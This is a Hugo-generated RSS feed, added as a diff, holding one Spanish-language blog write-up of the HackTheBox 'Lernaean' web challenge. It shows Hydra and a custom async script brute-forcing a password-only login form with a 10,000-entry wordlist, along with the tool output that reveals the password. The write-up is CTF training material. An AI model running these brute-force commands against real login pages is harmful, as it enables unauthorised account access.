@@ -1,0 +1,122 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>hydra on #&gt; fireroot</title>
+        <link>https://www.procamora.com/tags/hydra/</link>
+        <description>Recent content in hydra on #&gt; fireroot</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>es</language>
+        <lastBuildDate>Thu, 28 Nov 2019 00:00:00 +0000</lastBuildDate><atom:link href="https://www.procamora.com/tags/hydra/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Lernaean Writeup HackTheBox Web Challenge</title>
+        <link>https://www.procamora.com/p/lernaean-writeup-hackthebox-web-challenge/</link>
+        <pubDate>Thu, 28 Nov 2019 00:00:00 +0000</pubDate>
+        
+        <guid>https://www.procamora.com/p/lernaean-writeup-hackthebox-web-challenge/</guid>
+        <description>&lt;img src="https://www.procamora.com/covers/draft.png" alt="Featured image of post Lernaean Writeup HackTheBox Web Challenge" /&gt;&lt;p&gt;La descripción del reto es la siguiente:&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Your target is not very good with computers. Try and guess their password to see if they may be hiding anything!&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Con esta descripción podemos entender que podemos adivinar la contraseña, por lo que debería de estar en un diccionario de las contraseñas mas utilizadas. Por este motivo se realizará un ataque de fuerza bruta, para realizarlo podemos usar tres herramientas diferentes: Hydra, Burp Suite y un script propio.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://www.procamora.com/images/2019/lernaean_login.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Login&#34;
+	
+	
+&gt;{:height=&amp;ldquo;auto&amp;rdquo; width=&amp;ldquo;100%&amp;rdquo;}&lt;/p&gt;
+&lt;p&gt;Si analizamos la web se puede ver que solo es necesario introducir la contraseña, lo que hará que el ataque por fuerza bruta menos costoso en tiempo de ejecución. Si analizamos la petición que se realiza con el login, ya sea con Burp, Wireshark o el propio navegador vemos que unicamente se envía el campo &lt;em&gt;password&lt;/em&gt; y como respuesta recibimos la misma web pero con un &lt;em&gt;Invalid password!&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;Si se realiza el ataque con Hydra, sería necesario indicar los siguientes argumentos:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hydra -l admin -P 10-million-password-list-top-10000.txt docker.hackthebox.eu http-post-form &lt;span class=&#34;s2&#34;&gt;&amp;#34;/:password=^PASS^:Invalid password!&amp;#34;&lt;/span&gt; -s &lt;span class=&#34;m&#34;&gt;32345&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Con lo que obtendríamos una salida similar a esta indicando que la contraseña es &lt;em&gt;leonardo&lt;/em&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-11-28 15:17:33
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[DATA] max 16 tasks per 1 server, overall 16 tasks, 10000 login tries (l:1/p:10000), ~625 tries per task
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[DATA] attacking http-post-form://docker.hackthebox.eu:32345/:password=^PASS^:Invalid password!
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[STATUS] 788.00 tries/min, 788 tries in 00:01h, 9212 to do in 00:12h, 16 active
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[32345][http-post-form] host: docker.hackthebox.eu   login: admin   password: leonardo
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1 of 1 target successfully completed, 1 valid password found
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-11-28 15:19:42
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Si se realiza el ataque con el script propio, que puede encontrase en el siguiente &lt;a class=&#34;link&#34; href=&#34;https://github.com/procamora/Pentesting/blob/master/bruteforce_post_async.py&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;repositorio&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 bruteforce_post_async.py  http://docker.hackthebox.eu:31658/ &lt;span class=&#34;s1&#34;&gt;&amp;#39;Invalid password!&amp;#39;&lt;/span&gt; -l admin -P 10-million-password-list-top-10000.txt -j &lt;span class=&#34;s1&#34;&gt;&amp;#39;{&amp;#34;password&amp;#34;:&amp;#34;&amp;#34;}&amp;#39;&lt;/span&gt; -v
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Se obtendría la siguiente salida:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  DEBUG - bruteforce_post_async - bound_fetch - Trying 1395/10001: user: &amp;#34;admin&amp;#34;, pass: &amp;#34;lancer&amp;#34; -&amp;gt; Fail
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  DEBUG - bruteforce_post_async - bound_fetch - Trying 1401/10001: user: &amp;#34;admin&amp;#34;, pass: &amp;#34;siemens&amp;#34; -&amp;gt; Fail
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  DEBUG - bruteforce_post_async - bound_fetch - Trying 1403/10001: user: &amp;#34;admin&amp;#34;, pass: &amp;#34;minnie&amp;#34; -&amp;gt; Fail
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  DEBUG - bruteforce_post_async - check_regex_response - EXITO
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  WARNING - bruteforce_post_async - bound_fetch - Trying 1404/10001: user: &amp;#34;admin&amp;#34;, pass: &amp;#34;leonardo&amp;#34; -&amp;gt; Success
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Si introducimos como contraseña &lt;em&gt;leonardo&lt;/em&gt; en el login vemos que nos muestra la siguiente pantalla:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://www.procamora.com/images/2019/lernaean_correct.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Correct&#34;
+	
+	
+&gt;{:height=&amp;ldquo;auto&amp;rdquo; width=&amp;ldquo;100%&amp;rdquo;}&lt;/p&gt;
+&lt;p&gt;Parece que algo no estamos viendo, por eso volvemos a realizar el proceso de login pero en esta ocasión capturamos todos los paquetes que recibimos, ya sea con Burp, Wireshark o el navegador, y veríamos que en la respuesta el POST con el login viene el flag que buscamos, como podemos ver a continuación:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://www.procamora.com/images/2019/lernaean_response.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Response&#34;
+	
+	
+&gt;{:height=&amp;ldquo;auto&amp;rdquo; width=&amp;ldquo;100%&amp;rdquo;}&lt;/p&gt;
+&lt;p&gt;Cabe destacar que se ha calculado los tiempos de ejecución para ambos y han sido los siguientes:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Tiempo de ejecución de hydra: 1m33,668s&lt;/li&gt;
+&lt;li&gt;Tiempo de ejecución de script: 0m4,643s&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Esto se debe a que mi script manda peticiones asíncronas en bloques de 1000. Posiblemente Hydra también se pueda configurar para que aumente las conexiones paralelas, pero en esta ocasión se han dejado por defecto.&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
